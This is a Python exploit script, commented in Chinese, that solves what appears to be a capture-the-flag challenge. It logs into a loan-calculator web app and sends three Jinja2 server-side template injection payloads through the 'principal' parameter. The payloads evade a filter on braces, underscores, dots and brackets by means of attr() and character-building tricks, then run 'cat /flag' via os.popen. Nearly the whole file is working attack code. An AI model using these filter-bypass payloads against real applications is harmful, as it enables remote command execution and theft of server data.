#!/usr/bin/env python3
"""
X-063-24 SSTI Exploit Script
利用 /total_loan_payments 接口的 SSTI 漏洞读取 flag

漏洞说明:
- 注入点: /total_loan_payments 接口的 principal 参数
- 漏洞类型: Server-Side Template Injection (Jinja2)
- 过滤规则: 禁止 {{ }} _ . [ ]
- 绕过方法: 使用 {% set %} 语句块 + attr() 过滤器 + 字符拼接
"""

import requests
import json

# 目标URL
BASE_URL = "http://ip32825"

# 创建session保持会话
session = requests.Session()

print("="*70)
print("  X-063-24 SSTI Exploit - Jinja2 模板注入")
print("="*70)

print("\n[步骤 1] 登录系统")
print("-"*70)
login_data = {
    'username': 'test',
    'password': 'test'
}
try:
    login_response = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False, timeout=10)
    if login_response.status_code == 302:
        print(f"✓ 登录成功 (状态码: {login_response.status_code})")
        print(f"✓ 会话Cookie: {session.cookies.get('session', 'N/A')[:50]}...")
    else:
        print(f"✗ 登录失败 (状态码: {login_response.status_code})")
        exit(1)
except Exception as e:
    print(f"✗ 登录失败: {e}")
    exit(1)

print("\n[步骤 2] 准备SSTI Payload")
print("-"*70)
print("过滤限制: 不能使用 {{ }} _ . [ ]")
print("绕过技巧:")
print("  • 使用 {%% set %%} 代替 {{ }}")
print("  • 使用 |attr() 代替点号")
print("  • 使用 \\x5f 或字符拼接生成下划线")
print("  • 使用 |string|list|attr('pop')(n) 代替数组访问")

# 多个payload尝试
payloads = [
    {
        "name": "使用 \\x5f 直接构造下划线",
        "payload": """{% set u='\x5f' %}{% set uu=u~u %}{% set glb=lipsum|attr(uu~'globals'~uu) %}{% set bi=glb|attr('get')(uu~'builtins'~uu) %}{% set imp=bi|attr('get')(uu~'import'~uu) %}{% set os=imp('os') %}{% set payment=os|attr('popen')('cat /flag')|attr('read')() %}"""
    },
    {
        "name": "从 lipsum 字符串提取下划线",  
        "payload": """{% set s=lipsum|string %}{% set u=s|list|attr('pop')(18) %}{% set uu=u~u %}{% set glb=lipsum|attr(uu~'globals'~uu) %}{% set bi=glb|attr('get')(uu~'builtins'~uu) %}{% set imp=bi|attr('get')(uu~'import'~uu) %}{% set os=imp('os') %}{% set payment=os|attr('popen')('cat /flag')|attr('read')() %}"""
    },
    {
        "name": "通过 cycler 构造",
        "payload": """{% set c=cycler(1) %}{% set s=c|string %}{% set u=s|list|attr('pop')(2) %}{% set uu=u~u %}{% set glb=lipsum|attr(uu~'globals'~uu) %}{% set bi=glb|attr('get')(uu~'builtins'~uu) %}{% set imp=bi|attr('get')(uu~'import'~uu) %}{% set os=imp('os') %}{% set payment=os|attr('popen')('cat /flag')|attr('read')() %}"""
    },
]

flag_found = False

for i, payload_obj in enumerate(payloads, 1):
    print(f"\n[步骤 3.{i}] 尝试 Payload #{i}: {payload_obj['name']}")
    print("-"*70)
    
    payload = payload_obj['payload']
    
    # 验证payload不包含禁止字符
    forbidden_chars = {'{{', '}}', '[', ']', '_', '.'}
    violations = []
    for fc in forbidden_chars:
        if fc in payload:
            violations.append(fc)
    
    if violations:
        print(f"⚠ 警告: Payload包含禁止字符: {violations}")
        print(f"  跳过此payload")
        continue
    
    print(f"✓ Payload验证通过 (长度: {len(payload)} 字符)")
    print(f"  前100字符: {payload[:100]}...")
    
    # 发送请求
    params = {
        'principal': payload,
        'payment': '1',
        'term': '1'
    }
    
    try:
        response = session.get(f"{BASE_URL}/total_loan_payments", params=params, timeout=15)
        
        print(f"\n响应状态: {response.status_code}")
        
        if response.status_code == 200:
            print("✓ 请求成功!")
            
            try:
                data = json.loads(response.text)
                print("\nJSON响应:")
                print(f"  loan_principal: {data.get('loan_principal', 'N/A')}")
                print(f"  monthly_payment: {data.get('monthly_payment', 'N/A')}")
                print(f"  total_loan_payments: {data.get('total_loan_payments', 'N/A')}")
                
                # 提取flag (应该在 payment 相关字段)
                flag = data.get('monthly_payment', '').strip()
                if not flag or flag == '1' or flag == '':
                    flag = data.get('total_loan_payments', '').strip()
                
                if flag and flag not in ['', '1', '1.0']:
                    print("\n" + "="*70)
                    print(f"  FLAG: {flag}")
                    print("="*70)
                    flag_found = True
                    break
                else:
                    print("✗ 返回值无效,未获取到flag")
                    
            except json.JSONDecodeError as e:
                print(f"✗ JSON解析失败: {e}")
                print(f"  原始响应 (前300字符): {response.text[:300]}")
                
        elif response.status_code == 400:
            print(f"✗ 请求被拒绝 (400 Bad Request)")
            print(f"  服务器响应: {response.text[:200]}")
        elif response.status_code == 500:
            print(f"✗ 服务器错误 (500 Internal Server Error)")
            print(f"  可能是payload语法错误或执行失败")
        else:
            print(f"✗ 未知错误 (状态码: {response.status_code})")
            print(f"  响应: {response.text[:200]}")
            
    except requests.Timeout:
        print(f"✗ 请求超时")
    except Exception as e:
        print(f"✗ 异常: {e}")

if not flag_found:
    print("\n" + "="*70)
    print(" ！所有payload都未成功获取flag")
    print("  可能需要手动调试或尝试其他绕过方法")
    print("="*70)

print("\n[完成]")
